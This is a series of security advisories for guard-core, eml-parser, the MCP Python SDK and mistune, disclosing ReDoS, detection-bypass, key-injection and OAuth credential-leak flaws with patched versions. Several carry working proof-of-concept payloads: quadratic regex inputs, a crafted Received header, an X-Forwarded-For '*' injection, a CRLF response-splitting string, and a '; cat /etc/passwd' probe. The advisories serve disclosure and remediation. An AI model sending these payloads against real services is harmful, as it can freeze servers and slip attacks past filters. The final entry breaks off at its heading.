entry.title: [guard-core] Guard Core: Unvalidated X-Forwarded-For-derived string used as a Redis key component and interpolated into a KEYS glob pattern
entry.content:
Affected versions

PackageVulnerable versionsPatched version
guard-core >= 1.0.0, < 3.13.0 3.13.0

Summary

_extract_from_forwarded_header() (guard_core/utils.py:172-181 in 3.12.0; :179 on master 08780f1) returns the selected X-Forwarded-For entry without any ipaddress validation. When that entry is attacker-controlled, an arbitrary string becomes client_ip and flows into BehaviorTracker (guard_core/handlers/behavior_handler.py:83-102), which interpolates it verbatim into both a Redis key name and a KEYS glob pattern:

key = f"behavior:usage:{endpoint_id}:{client_ip}"
await self.redis_handler.set_key("behavior_usage", f"{key}:{current_time}", "1", ttl=rule.window)
pattern = f"behavior_usage:{key}:*"
keys = await self.redis_handler.keys(pattern)      # blocking KEYS, O(N) over keyspace

Same shape in track_return_pattern() (behavior_handler.py:135-142). redis_handler.keys() maps to the blocking Redis KEYS command (guard_core/handlers/redis_handler.py:265-275).

Details

Three consequences, in increasing severity:

  1. Cross-client counter contamination. X-Forwarded-For: * makes the glob match every client's behavior-usage keys for the endpoint. Verified with a fake-Redis harness: a client 9.9.9.9 hit an endpoint 3 times (threshold=3 rule), then a single attacker request carrying XFF: * issued the pattern behavior_usage:behavior:usage:app.login:*:*, counted the victim's events, and tripped the rule on its first request. An embedded : also shifts which key segment is parsed as the timestamp (behavior_handler.py:94-100).
  2. Unbounded key-space growth + blocking scans. Each request creates a new unique key (f"{key}:{current_time}") and then issues a blocking KEYS scan whose cost grows with total keys — on the shared Redis instance, degrading every guard-core instance using it. Rotating arbitrary XFF strings multiplies distinct keys without bound.
  3. Error path. A tripped ban action passes the non-IP string to ip_ban_manager.ban_ip(), whose ipaddress validation raises ValueError uncaught in the behavioral processor — the request 500s.

PoC

import asyncio
from types import SimpleNamespace
from guard_core.models import SecurityConfig
from guard_core.utils import extract_client_ip

class CIHeaders(dict):
    def get(self, key, default=None):
        for k, v in self.items():
            if k.lower() == key.lower():
                return v
        return default

class FakeRequest:
    def __init__(self, xff):
        self.state = SimpleNamespace()
        self.client_host = "10.0.0.1"          # the TRUSTED proxy
        self.headers = CIHeaders({"X-Forwarded-For": xff})

async def main():
    config = SecurityConfig(trusted_proxies=("10.0.0.1",), enable_redis=False)
    ip = await extract_client_ip(FakeRequest("*"), config)
    print(repr(ip))        # -> '*'  (arbitrary string, no validation)

asyncio.run(main())

Then BehaviorTracker.track_endpoint_usage("app.login", "*", rule) issues KEYS behavior_usage:behavior:usage:app.login:*:* — matching other clients' keys (full fake-Redis script: poc_xff_redis.py, available on request).

Impact

Integrity and availability of the behavioral-analytics subsystem and the shared Redis instance, in deployments where the extracted XFF position is attacker-controllable. No data exposure; not reachable with default settings (trusted_proxies defaults empty).

Fix: validate the extracted XFF entry with ipaddress.ip_address() before returning it from extract_client_ip() (fall back to the connecting IP on failure); escape glob metacharacters (*?[]) in anything interpolated into a KEYS pattern — or replace the KEYS+per-request-key design with an atomic counter / Lua sliding window (the rate-limit Lua script already shows the right shape).

References

  • https://github.com/Guard-Core/guard-core/security/advisories/GHSA-gm9r-hvc9-96gv
  • https://nvd.nist.gov/vuln/detail/CVE-2026-129304
  • https://github.com/Guard-Core/guard-core/pull/68
  • https://github.com/Guard-Core/guard-core/commit/c07239fa1c5aa93e3f179440e79dad652977d3e4
  • https://github.com/Guard-Core/guard-core/releases/tag/3.13.0

entry.title: [guard-core] Guard Core: Whitespace-collapse preprocessing permanently disables the CRLF-anchored http-splitting and command-injection detectors in the default detection mode
entry.content:
Affected versions

PackageVulnerable versionsPatched version
guard-core >= 1.0.0, < 3.13.0 3.13.0

Summary

In the default "enhanced" detection mode, ContentPreprocessor.preprocess() collapses all whitespace (re.sub(r"\s+", " ", content), guard_core/detection_engine/preprocessor.py:137 on master 08780f1; :384 in the 3.12.0 sdist) before pattern matching. This erases every \r and \n from the scanned value, rendering two built-in detectors structurally unmatchable regardless of input:

  • http_split — guard_core/handlers/suspatterns_handler.py:540: r"[\r\n]\s*(?:HTTP\/[0-9.]+|Location:|Set-Cookie:)" requires a literal \r or \n, which no longer exists after preprocessing;
  • cmd_injection — r"\n\s*(?:bash|sh|...)\s+-c\b" — same structural death.

The downstream application receives the raw value with CRLF intact (Starlette percent-decodes %0d%0a in query parameters before the adapter passes request.query_params.items() to guard_core/utils.py:843-865), so a response-splitting-shaped payload passes detection unflagged.

Details

Verified end-to-end against a real uvicorn server running the fastapi-guard adapter over guard-core 3.12.0, default config:

request (?q=) status
value%0d%0aHTTP%2F1.1+200+OK%0d%0aSet-Cookie%3A+pwned%3D1 (decoded to literal CRLF by the framework) 200 — missed
' OR 1=1-- 400 — blocked (detection otherwise working)
1 UNION SELECT password FROM users-- 400 — blocked
; cat /etc/passwd 400 — blocked

The legacy mode (no SecurityConfig detection attributes) skips preprocessing and catches the same decoded CRLF payload — the gap is specific to the enhanced-mode preprocessing pipeline, which every stock SecurityConfig activates. Contrast: every other preprocessing step (URL/HTML/hex/base64 decode) transforms toward what the attacker means; whitespace collapse is the one step that removes signal the detectors were written to require.

PoC

import asyncio
import httpx
import uvicorn
from fastapi import FastAPI
from guard.adapters import SecurityMiddleware  # fastapi-guard adapter over guard-core
from guard_core.models import SecurityConfig
from starlette.middleware import Middleware

app = FastAPI(middleware=[Middleware(
    SecurityMiddleware, config=SecurityConfig(enable_redis=False))])

@app.get("/search")
async def search(q: str = "") -> dict:
    return {"len": len(q)}

async def main() -> None:
    server = uvicorn.Server(uvicorn.Config(app, host="127.0.0.1", port=8995, log_level="error"))
    task = asyncio.create_task(server.serve())
    for _ in range(50):
        if server.started:
            break
        await asyncio.sleep(0.1)
    async with httpx.AsyncClient() as client:
        r = await client.get("http://127.0.0.1:8995/search",
            params={"q": "value%0d%0aHTTP%2F1.1+200+OK%0d%0aSet-Cookie%3A+pwned%3D1"})
        print("CRLF payload:", r.status_code, "(200 = missed)")
        r2 = await client.get("http://127.0.0.1:8995/search", params={"q": "' OR 1=1--"})
        print("SQLi control:", r2.status_code, "(400 = detection works)")
    server.should_exit = True
    await task

asyncio.run(main())
# Output: CRLF payload: 200 (missed) / SQLi control: 400 (blocked)

Impact

A detection bypass in a WAF/defense-in-depth layer: payloads shaped like HTTP response splitting (or newline-anchored command injection) are not flagged in the default mode, while other attack classes are. Not directly exploitable against Starlette/uvicorn-backed apps (they reject CRLF in response headers); the residual risk is for apps behind other stacks or apps that persist and re-emit the value where a CRLF-tolerant parser exists.

Fix: preserve \r\n during whitespace collapse (collapse only [ \t]+), or run the newline-anchored patterns against the pre-collapse content.

Reporter validation request

The fix ships in guard-core 3.13.0, now on PyPI. If you reported this issue, please install 3.13.0 and confirm it is resolved. You can reply in this advisory's discussion thread or open a new issue with the result.

References

entry.title: [guard-core] Guard Core: Quadratic ReDoS in built-in detection pattern freezes the event loop with a single request
entry.content:
Affected versions

PackageVulnerable versionsPatched version
guard-core >= 3.5.0, <= 3.12.0 3.13.0

Summary

A polynomial (quadratic) regular-expression denial of service in guard-core's built-in penetration-detection patterns allows any unauthenticated remote client to freeze every endpoint of an application for seconds per request, using only the default configuration. The triggering request completes without any detection match — no ban counter increments, no rate-limit violation is recorded — so it can be repeated indefinitely. Since guard-core 3.5.0, only custom patterns are executed through the compiler's timeout-protected create_safe_matcher(); all built-in patterns run as a bare, inline pattern.search(content) directly on the asyncio event loop. guard-core ≤ 3.4.0 ran built-ins through the safe matcher (verified in the 3.4.0 wheel, _check_regex_pattern), so this is a regression introduced in 3.5.0 — and it silently undoes the protection credited to GHSA-rrf6-pxg8-684g (CVE-2025-54365) and the unbounded-quantifier remediation of GHSA-j47q-rc62-w448 (CVE-2025-53539) for every stock pattern, despite the changelog advertising "Safe regex execution with configurable timeouts to prevent ReDoS attacks."

Details

1. The pattern — guard_core/handlers/suspatterns_handler.py:519 (master 08780f1), the built-in template-injection detector:

r"\{\{\s*[^\}]+(?:system|exec|popen|eval|require|include)\s*\}\}"

On an input of { repeated N times, every one of the N−1 positions starts a \{\{ match attempt and [^\}]+ scans to end-of-string and backtracks once per position → O(N²). Note the sibling pattern at :524 (\{\%\s*[^\%]+...) is not vulnerable — its delimiter % is excluded from the character class, keeping scans bounded — which confirms the root cause is the unbounded, non-excluding [^\}]+.

2. The unprotected execution path — guard_core/handlers/suspatterns_handler.py:910-926:

if compiler:
    if category == "custom":
        safe_matcher = compiler.create_safe_matcher(pattern)   # executor + timeout
        match = safe_matcher(content)
        ...
    else:
        match = pattern.search(content)                        # ← inline, NO timeout

In enhanced mode (the default whenever a SecurityConfig is present — _supports_enhanced_config() is a duck-type attribute check a stock config always passes), all built-in patterns execute inline inside the async coroutine, blocking the event loop for the full scan. In guard-core ≤ 3.4.0, _check_regex_pattern() routed every pattern through self._compiler.create_safe_matcher(pattern.pattern) (verified in the 3.4.0 wheel, suspatterns_handler.py:565-567) or, without a compiler, through _check_pattern_with_timeout (4-worker pool + per-pattern timeout). The category == "custom" exemption appeared in 3.5.0.

3. Default reachability — penetration detection is on by default (enable_penetration_detection=True), query parameters are scanned by default (guard_core/utils.py:843-865), and the default scan window detection_max_content_length=10000 (models.py:765-770) admits the full 10,000-character payload. A run of { survives preprocessing untouched.

Measured (CPython 3.14, guard-core 3.12.0):

input detect() wall time event-loop lag (measured in-process)
{ × 2,500 0.15 s —
{ × 5,000 0.46 s —
{ × 10,000 1.85 s 2.57 s cumulative across the three calls

Clean 4× per doubling — quadratic, not exponential. Profiling all built-ins against the payload attributes 1.766 s of the 1.77 s total to this single pattern (one-line fix: bound the gap, e.g. \{\{\s*[^\}\s]{0,64}(?:system|exec|popen|eval|require|include)\s*\}\}).

Amplification: every scanned value pays the cost independently (utils.py:843-890 per query param/header; utils.py:936-977 per JSON string field). A single 256 KB JSON body (the default detection_max_body_inspect_bytes) containing ~25 string fields of {×10,000 measured 44.03 s of continuous event-loop blockage from one request, returning normally with no detection hit.

Why rate limiting doesn't help: guard-core defaults are rate_limit=10 per rate_limit_window=60 s (models.py:369-375), and the rate_limit check runs before suspicious_activity in the default pipeline. 10 × 44 s = 440 s of loop blockage per 60 s window from a single IP — single-source saturation, no distribution needed.

Framework reach: any adapter embedding guard-core on an asyncio loop — fastapi-guard, flaskapi-guard (async deployments), djapi-guard (ASGI) — shares the loop with the application, so the freeze takes down every endpoint of the host application, not just the guarded routes.

PoC

guard-core only — no framework adapter needed. Requires pip install guard-core, then python poc_guard_core_redos.py. Exit code 0 = freeze reproduced.

"""PoC: event-loop ReDoS in guard-core (>= 3.5.0, <= 3.12.0), default config.

The built-in template-injection pattern is quadratic on '{' x N, and since 3.5.0
built-in patterns execute inline (pattern.search) with NO timeout — only
`custom` patterns get the compiler's safe matcher. One detect() call with a
10,000-char value blocks the event loop ~1.8s; a 256KB JSON body with ~25 such
fields blocks it ~44s. Runs on the asyncio loop that any adapter
(fastapi-guard, flaskapi-guard, djapi-guard) shares with the app.

Run:  python poc_guard_core_redos.py
Exit code 0 = freeze reproduced (max loop lag > 1s).
"""

import asyncio
import time

from guard_core.handlers.suspatterns_handler import sus_patterns_handler
from guard_core.models import SecurityConfig

LOOP_LAGS: list[float] = []


async def _loop_lag_monitor() -> None:
    while True:
        t0 = time.monotonic()
        await asyncio.sleep(0.05)
        LOOP_LAGS.append(time.monotonic() - t0 - 0.05)


async def main() -> int:
    config = SecurityConfig(enable_redis=False)  # defaults = enhanced mode
    sus_patterns_handler.configure(config)

    monitor = asyncio.create_task(_loop_lag_monitor())
    await asyncio.sleep(0.3)  # baseline samples

    for n in (2_500, 5_000, 10_000):
        t0 = time.perf_counter()
        result = await sus_patterns_handler.detect(
            content="{" * n, ip_address="203.0.113.7", context="query_param:q"
        )
        print(f"'{{' x {n:5d}: {time.perf_counter()-t0:.2f}s  is_threat={result['is_threat']}")

    # let the starved monitor task wake and record the lag it just endured
    await asyncio.sleep(0.1)
    max_lag = max(LOOP_LAGS)
    print(f"\nmax event-loop lag during run: {max_lag:.2f}s")
    print("VERDICT:", "FROZEN" if max_lag > 1.0 else "not reproduced")

    monitor.cancel()
    return 0 if max_lag > 1.0 else 1


if __name__ == "__main__":
    raise SystemExit(asyncio.run(main()))

Observed output (Python 3.14, guard-core 3.12.0):

'{' x  2500: 0.16s  is_threat=False
'{' x  5000: 0.51s  is_threat=False
'{' x 10000: 1.91s  is_threat=False

max event-loop lag during run: 2.57s
VERDICT: FROZEN

An end-to-end proof through the fastapi-guard adapter (default config, real uvicorn server, in-process loop-lag monitor) measured 1.75 s of server-side event-loop lag from one GET request returning HTTP 200 — available on request.

Impact

Kind of vulnerability: Regular Expression Denial of Service — CWE-1333 / CWE-400. Polynomial (quadratic) runtime, O(N²), not exponential backtracking.

Who is impacted: every application embedding guard-core ≥ 3.5.0 with its default configuration (penetration detection enabled) in a single-process asyncio deployment. One unauthenticated request freezes all endpoints for ~1.8 s; one padded POST body freezes them for tens of seconds; repeated requests at only 10/min saturate the worker indefinitely. Because the payload triggers no detection match, no ban counter increments and nothing is logged as suspicious — the attack is invisible in guard-core's own telemetry.

Fix directions: (1) bound the quantifier in the template pattern (its {% sibling at :524 is already safe because [^\%]+ excludes the delimiter — excluding the delimiter, or bounding the gap, closes it); (2) route built-in patterns through the same create_safe_matcher() timeout path as custom patterns, restoring the ≤ 3.4.0 behavior that the changelog advertises.

Reporter validation request

The fix ships in guard-core 3.13.0, now on PyPI. If you reported this issue, please install 3.13.0 and confirm it is resolved. You can reply in this advisory's discussion thread or open a new issue with the result.

References

  • https://github.com/Guard-Core/guard-core/security/advisories/GHSA-r7hm-rjvg-xx7j
  • https://nvd.nist.gov/vuln/detail/CVE-2026-129302
  • https://github.com/Guard-Core/guard-core/pull/68
  • https://github.com/Guard-Core/guard-core/commit/c07239fa1c5aa93e3f179440e79dad652977d3e4
  • https://github.com/Guard-Core/guard-core/releases/tag/3.13.0
  • https://github.com/advisories/GHSA-r7hm-rjvg-xx7j

entry.title: [eml-parser] eml_parser: Algorithmic-complexity DoS (O(n^4) regex backtracking) in Received-header parsing
entry.content:
Affected versions

PackageVulnerable versionsPatched version
eml-parser <= 3.0.3 3.0.4

Summary

eml_parser.routing.parserouting() dynamically builds a regex from up to four greedy .* groups (from (?P<from>.*)by (?P<by>.*)with (?P<with>.*)for (?P<for>.*)) terminated by an escaped literal of the date extracted from a normalized copy of the Received header. Because the date literal comes from the normalized text but is searched in the original line, a crafted header can make the trailing literal unmatchable; the search then fails at every start position only after exhaustively backtracking the four nested greedy groups — O(n^4) in header length. A single ~5.9 KB email pins one CPU core for ~12 seconds; doubling the input multiplies the cost ~25x, so a ~13 KB header takes minutes and a ~25 KB header effectively hangs the parse worker.

Details

Root cause: eml_parser/routing.py:140-148 (v3.0.3):

reg = ''
for item in tout:
    reg += item[1] + '(?P<' + item[1].strip() + '>.*)'   # e.g. 'from (?P<from>.*)'
if npdate:
    reg += eml_parser.regexes.escape_special_regex_chars.sub(r"""\\\1""", npdate)
reparse = re.compile(reg)
reparseg = reparse.search(line)   # searched in the ORIGINAL line

npdate is extracted from npline, a normalized copy of the header (spacing added around (, ), ; at routing.py:79-81; parenthesized text removed at line 82; whitespace collapsed at line 83), so it is not guaranteed to be a substring of line. An unbalanced ( in the date tail (e.g. +0000(comment) becomes ( comment in npline but stays (comment in line, making the mandatory trailing literal unmatchable.

Data flow: attacker-controlled Received: header (arbitrary length; the custom policy sets max_line_length=0) -> parser.py:352-355 (lowercased, whitespace-flattened, no size cap - unlike body text, which is sliced) -> parser.py:365 routing.parserouting(...) -> O(n^4) search. Every Received header is processed, multiplying the cost, and the behavior cannot be disabled via any EmlParser option.

Measured on Python 3.14 (identical with stdlib re and the optional regex module):

Segments Header size Wall time
20 1.4 KB 0.022 s
40 2.9 KB 0.43 s
80 5.8 KB 12 s
160 (extrapolated) 13 KB ~5 min

cProfile attributes 83% of wall time to re.Pattern.search called from routing.parserouting. The parse completes normally (no exception) - it is pure CPU exhaustion.

This is distinct from GHSA-g47v-rwmh-r9f8 (recursion DoS in get_raw_body_text(), fixed via MULTIPART_RECURSION_LIMIT - different function and mechanism) and from issue #48 (old url_regex_simple body-path hang; body regexes now run on ~600-char slices, capping impact - the Received-header path is unsliced).

PoC

import eml_parser

seg = 'from h{0}.example.com by mx{0}.example.com with esmtp for u{0}@example.com '
received = ''.join(seg.format(i) for i in range(80)) + ';Mon, 01 Jan 2024 00:00:00 +0000(comment'
# NB: unbalanced '(' in the date tail -> the normalized date literal never occurs in the
# searched line, so the dynamic 4-group greedy regex can never match and backtracks O(n^4).

eml = (
    'Received: ' + received + '\r\n'
    'From: attacker@evil.example\r\n'
    'To: victim@target.example\r\n'
    'Subject: poc\r\n'
    'Content-Type: text/plain\r\n'
    '\r\n'
    'hello\r\n'
).encode()

import time
t0 = time.perf_counter()
eml_parser.EmlParser().decode_email_bytes(eml)
print(f'{time.perf_counter() - t0:.2f}s')   # ~12 s for a 5.9 KB input

Observed on v3.0.3: eml size: 5887 bytes, decode_email_bytes() wall time: 12.33s, message parses fine. Affected APIs: decode_email, decode_email_bytes, parse_email.

Impact

Algorithmic-complexity denial of service. Any application that parses untrusted email with eml_parser (mail gateways, phishing-analysis and forensics pipelines, ticketing systems) can have a parser worker pinned by a single small email; an attacker sending a steady trickle of such messages keeps workers permanently busy (CPU exhaustion, queue backlog) even behind per-message timeouts. No crash, corruption, or information leak - availability impact only.

Reporter credit: Niranjan Ganesan (https://securityinsights.io/, @iam-niranjan)

Resolution

An algorithmic complexity vulnerability ($O(n^4)$ ReDoS) in eml_parser.routing.parserouting() was resolved.

Previously, parserouting() dynamically constructed a regex using multiple greedy .* capture groups appended with a normalized date string (npdate). Because npdate was extracted from a normalized copy of the Received header line, formatting mismatches between npdate and the un-normalized input line could render the trailing literal unmatchable. This forced the engine into exhaustive backtracking across nested greedy groups on unmatchable inputs, causing high CPU consumption and potential worker hangs on malicious headers.

Fix:

  1. Dynamic Regex Construction: Removed the static npdate suffix from the compiled pattern, replacing it with non-greedy field capture groups (.*?) terminated lazily by a semicolon or end-of-line anchor ((?:;|$)).
  2. Keyword Ordering Logic: Streamlined the routing keyword position detection to a single-pass str.find() search, removing $O(k^2)$ matrix evaluations.

These changes eliminate catastrophic backtracking and reduce processing time from $O(n^4)$ to linear $O(n)$ complexity.

References

  • https://github.com/GOVCERT-LU/eml_parser/security/advisories/GHSA-m4g8-47f9-h588
  • https://nvd.nist.gov/vuln/detail/CVE-2026-129307
  • https://github.com/GOVCERT-LU/eml_parser/commit/54ea6e9f54fecda3059283ccdb6a6fd99e7ce92f
  • https://github.com/GOVCERT-LU/eml_parser/releases/tag/v3.0.4

entry.title: [mcp] Model Context Protocol Python SDK: OAuth client could send credentials to an authorization server chosen by the MCP server
entry.content:
Affected versions

PackageVulnerable versionsPatched version
mcp >= 1.9.1, < 1.30.0 1.30.0

Summary

In affected versions, the SDK's OAuth client support (mcp.client.auth) let the MCP server a client connected to decide where the client's OAuth credentials were sent:

  • the authorization server metadata issuer was not validated on every discovery path, and
  • stored or pre-provisioned client credentials were not bound to the authorization server they belong to.

A malicious or compromised MCP server could therefore direct them to a token endpoint of its choosing:

  • by naming its own authorization server in its protected resource metadata, or
  • by publishing none and serving metadata that presents the user's real authorization server as the issuer.

It would then receive the client_secret, authorization code and PKCE code_verifier meant for that real server (or, with PrivateKeyJWTOAuthProvider, a signed client assertion).

Am I affected?

Yes, if both of these hold:

  • your application uses the SDK as an MCP client over HTTP with OAuthClientProvider, ClientCredentialsOAuthProvider, PrivateKeyJWTOAuthProvider or the deprecated 1.x RFC7523OAuthClientProvider as the transport's auth handler;
  • it may connect to an MCP server you do not fully trust while holding credentials for a legitimate authorization server (a pre-provisioned secret or signing key, or a stored client registration).

Affected versions:

  • 1.9.1 through 1.29.1: no issuer check and no credential binding on any path.
  • 2.0.0 through 2.1.1: both missing whenever the server publishes no protected resource metadata (the legacy fallback) or answers 403 insufficient_scope.
  • Both lines, on every path: ClientCredentialsOAuthProvider and PrivateKeyJWTOAuthProvider had no way to name the authorization server their credentials belong to.

Not affected:

  • MCP servers built with the SDK
  • stdio clients
  • clients that attach their own tokens or headers

The rating is scored for the unattended providers. With the interactive OAuthClientProvider a person has to start the sign-in; scored that way it is 6.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N).

Fix

Upgrade to mcp 2.2.0 (2.x) or 1.30.0 (1.x) or later.

If you use ClientCredentialsOAuthProvider or PrivateKeyJWTOAuthProvider, upgrading changes nothing until you also pass issuer= (for example issuer="https://auth.example.com"):

  • Without it they still follow whichever authorization server the MCP server advertises.
  • Omitting it now emits a deprecation warning, and it becomes required in 3.0. On 1.30.0 it is a DeprecationWarning, which Python hides by default.
  • The deprecated 1.x RFC7523OAuthClientProvider has no issuer option. Move to one of these two providers.

In the fixed versions the client also:

  • works out which issuer it expects before fetching any authorization server metadata, on every path;
  • refuses metadata whose issuer differs, with OAuthFlowError;
  • binds stored registrations to that issuer, and discards one bound to a different issuer so the client registers again.

After upgrading:

entry.title: [mcp] Model Context Protocol Python SDK: OAuth client could send credentials to an authorization server chosen by the MCP server
entry.content:
Affected versions

PackageVulnerable versionsPatched version
mcp >= 2.0.0a1, < 2.2.0 2.2.0

Summary

In affected versions, the SDK's OAuth client support (mcp.client.auth) let the MCP server a client connected to decide where the client's OAuth credentials were sent:

  • the authorization server metadata issuer was not validated on every discovery path, and
  • stored or pre-provisioned client credentials were not bound to the authorization server they belong to.

A malicious or compromised MCP server could therefore direct them to a token endpoint of its choosing:

  • by naming its own authorization server in its protected resource metadata, or
  • by publishing none and serving metadata that presents the user's real authorization server as the issuer.

It would then receive the client_secret, authorization code and PKCE code_verifier meant for that real server (or, with PrivateKeyJWTOAuthProvider, a signed client assertion).

Am I affected?

Yes, if both of these hold:

  • your application uses the SDK as an MCP client over HTTP with OAuthClientProvider, ClientCredentialsOAuthProvider, PrivateKeyJWTOAuthProvider or the deprecated 1.x RFC7523OAuthClientProvider as the transport's auth handler;
  • it may connect to an MCP server you do not fully trust while holding credentials for a legitimate authorization server (a pre-provisioned secret or signing key, or a stored client registration).

Affected versions:

  • 1.9.1 through 1.29.1: no issuer check and no credential binding on any path.
  • 2.0.0 through 2.1.1: both missing whenever the server publishes no protected resource metadata (the legacy fallback) or answers 403 insufficient_scope.
  • Both lines, on every path: ClientCredentialsOAuthProvider and PrivateKeyJWTOAuthProvider had no way to name the authorization server their credentials belong to.

Not affected:

  • MCP servers built with the SDK
  • stdio clients
  • clients that attach their own tokens or headers

The rating is scored for the unattended providers. With the interactive OAuthClientProvider a person has to start the sign-in; scored that way it is 6.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N).

Fix

Upgrade to mcp 2.2.0 (2.x) or 1.30.0 (1.x) or later.

If you use ClientCredentialsOAuthProvider or PrivateKeyJWTOAuthProvider, upgrading changes nothing until you also pass issuer= (for example issuer="https://auth.example.com"):

  • Without it they still follow whichever authorization server the MCP server advertises.
  • Omitting it now emits a deprecation warning, and it becomes required in 3.0. On 1.30.0 it is a DeprecationWarning, which Python hides by default.
  • The deprecated 1.x RFC7523OAuthClientProvider has no issuer option. Move to one of these two providers.

In the fixed versions the client also:

  • works out which issuer it expects before fetching any authorization server metadata, on every path;
  • refuses metadata whose issuer differs, with OAuthFlowError;
  • binds stored registrations to that issuer, and discards one bound to a different issuer so the client registers again.

After upgrading:

  • Stored registrations: a registration stored without an issuer stays unbound. That includes everything 1.x stored before 1.30.0. Clear stored OAuth client information once so the client registers again. If you placed a pre-registered client in storage yourself, set issuer on that record instead.
  • Past exposure: if such a client may have connected to an untrusted MCP server, rotate its client secret and revoke its tokens at the authorization server.

On earlier versions there is no workaround other than connecting OAuth-enabled clients only to MCP servers you trust.

entry.title: [mistune] Mistune: Quadratic-time DoS in parse_link_href via unbounded parenthesis scan on empty-label links
entry.content:
Affected versions

PackageVulnerable versionsPatched version
mistune < 3.3.4 3.3.4

Resolution

Fixed in Mistune 3.3.4. Upgrade to 3.3.4 or later.

  • Affected versions: < 3.3.4
  • First patched version: 3.3.4
  • Fix: https://github.com/lepture/mistune/compare/v3.3.3...v3.3.4

The reported payload was reproduced against the 3.3.3 release tag and verified to scale approximately linearly against the 3.3.4 release tag.

Original report

The following report describes the issue before the fix.

Summary

parse_link_href in mistune performs an unbounded parenthesis-balancing scan that runs to end-of-document on each unmatched (. Because the empty label [] bypasses the no_close_bracket_before high-water-mark guard, a single small document of the form "[](" * N causes O(N) openers to each drive an O(N) scan, producing O(N²) CPU on the default mistune.html() renderer with no plugins.

Root Cause

parse_link matches the empty label [] (parse_link_label("[](",1) returns ('', 2)), so it reaches the ( branch and calls parse_link_href. That function's scan loop (helpers.py:143-159) advances past characters and increments level on each (, never finding an unescaped ) at level==0, so it runs to EOF and returns None. The cursor then advances only ~2 chars to the next [](. The no_close_bracket_before high-water mark that keeps the balanced-bracket link path linear is never entered because the empty label matches before that branch; _mark_no_link_before only advances past the 2-char label, not the href region.

Impact

A single unauthenticated request rendering untrusted markdown pins a worker at 100% CPU for tens of seconds. Measured on default mistune.html, no plugins: 6KB->0.80s, 12KB->3.15s, 24KB->12.5s, 48KB->49.8s (2x input -> ~3.9x time, clean O(n²)). This is the most severe of the mistune quadratic-DoS findings.

Proof of Concept

import mistune
md = mistune.create_markdown()   # default HTML renderer, no plugins
md("[](" * 16000)                # ~48KB input stalls a worker ~50s

Attack Chain

  1. Entry: rendered markdown body -> "[](" * N (3 bytes/unit, no plugins). Guard: none on input size (grep of markdown.py/core.py = no size/time cap). Bypass proof: no global guard exists.
  2. Check: parse_link guards at inline_parser.py:141 (no_link_before), :150 (no_close_bracket_before). Guard: high-water marks that linearize balanced-bracket links. Bypass proof: empty label matches (label != None) so the :150 branch is skipped entirely; no_link_before only crawls +2/opener because parse_link_label returns ('',2).
  3. Processing: parse_link_href (helpers.py:143) scans to EOF per ( (unbalanced parens), returns None.
  4. Sink: O(N) openers x O(N) scan each -> O(N²) CPU.
  5. Impact: single ~48KB request stalls a worker ~50s (single-threaded); ~200KB approx minutes.

Bypass Evidence

  • parse_link_label("[](",1) returns ('', 2) — the empty label matches, so the balanced-bracket branch owning no_close_bracket_before is never entered.
  • git log -S "if c == \"(\":" -- helpers.py returns only refactor 5de41fb; parse_link_href has NEVER received a DoS fix (all helpers.py DoS fixes targeted parse_link_text).
  • Empirical: the [*n unbalanced-bracket payload is LINEAR on HEAD (0.03->0.12s) while [](*n is O(n²) (3.99x per 2x) — proving the fix does not cover this branch.

Affected Versions

<= 3.3.3 (present on latest release tag v3.3.3 and HEAD 719107f; no fix on HEAD).

Suggested Fix

Add a high-water mark for parse_link_href failed scans (mirroring no_link_before/no_close_bracket_before), or bound the parenthesis scan to a maximum length, so repeated failed href scans cannot each traverse the remaining document.

Reported by zx (Jace) — GitHub: @manus-use

entry.title: [mistune] Mistune: Quadratic-time DoS in inline image parsing (precedence_scan) bypasses not-is-image guards
entry.content:
Affected versions

PackageVulnerable versionsPatched version
mistune < 3.3.4 3.3.4

Resolution

Fixed in Mistune 3.3.4. Upgrade to 3.3.4 or later.

  • Affected versions: < 3.3.4
  • First patched version: 3.3.4
  • Fix: https://github.com/lepture/mistune/compare/v3.3.3...v3.3.4

The reported payload was reproduced against the 3.3.3 release tag and verified to scale approximately linearly against the 3.3.4 release tag.

Original report

The following report describes the issue before the fix.

Summary

mistune's inline image parsing reaches precedence_scan for ![ openers because the two guards that keep the link path linear are both gated behind not is_image. A small default-renderer document of the form "![" * N + "x" + "]" * N produces O(N²) CPU with no plugins.

Root Cause

For ![ openers, is_image is True, so both linearizing guards are skipped: if not is_image and pos <= state.no_link_before (inline_parser.py:141) and has_nested_link = not is_image and _label_contains_link(...) (:171). Execution reaches precedence_scan (:179) which runs sc.search(state.src, mark_pos, end_pos) over the whole image body — O(n) per outer opener, x O(n) openers -> O(n²). max_image_depth never fires because the failing scans never produce an image token (image_depth stays 0).

Impact

A single unauthenticated request pins a worker at 100% CPU. Measured on default mistune.html, no plugins: 6KB->0.28s, 12KB->1.07s, 24KB->4.20s, 48KB->15.8s (2x input -> ~3.8x time).

Proof of Concept

import mistune
md = mistune.create_markdown()   # default, no plugins
md("![" * 16000 + "x" + "]" * 16000)

Attack Chain

  1. Entry: rendered markdown -> "!["*N + "x" + "]"*N (no plugins). Guard: none on input size. Bypass proof: no global cap.
  2. Check: not is_image guards at inline_parser.py:141 (no_link_before) and :171 (_label_contains_link). Guard: high-water mark + nested-link short-circuit. Bypass proof: is_image is True for ![, so BOTH guards are gated out; max_image_depth (:checked after) measured flat across all values because no image token is produced.
  3. Processing: reaches precedence_scan (:179) -> sc.search(state.src, mark_pos, end_pos) over the full body per opener.
  4. Sink: O(N) openers x O(N) scan -> O(N²) CPU.
  5. Impact: 48KB -> ~16s single-threaded worker stall.

Bypass Evidence

  • The LINK payload "["*n+"x"+"]"*n is LINEAR on HEAD (0.076s @ 16k, ~2x per 2x) because links get the _label_contains_link short-circuit; the IMAGE payload "!["*n+"x"+"]"*n is O(n²) (0.27->1.05->3.92s, ~3.8x). Same HEAD, only is_image differs — proves the guard asymmetry, not incidental input growth.
  • max_image_depth set across 0..100 leaves runtime flat (no image token produced by failing scans).

Affected Versions

<= 3.3.3 (present on latest release tag v3.3.3 and HEAD).

Suggested Fix

Generalize the no_link_before high-water mark (and/or the _label_contains_link short-circuit) to cover the image path, so failed ![ scans do not each re-traverse the document.

Reported by zx (Jace) — GitHub: @manus-use

entry.title: [iSponsorBlockTV] iSponsorBlockTV: SSRF via Malicious SSDP Response Spoofing in Local Device Discovery
entry.content:
Affected versions

PackageVulnerable versionsPatched version
iSponsorBlockTV <= 2.10.0 2.11.0

Summary

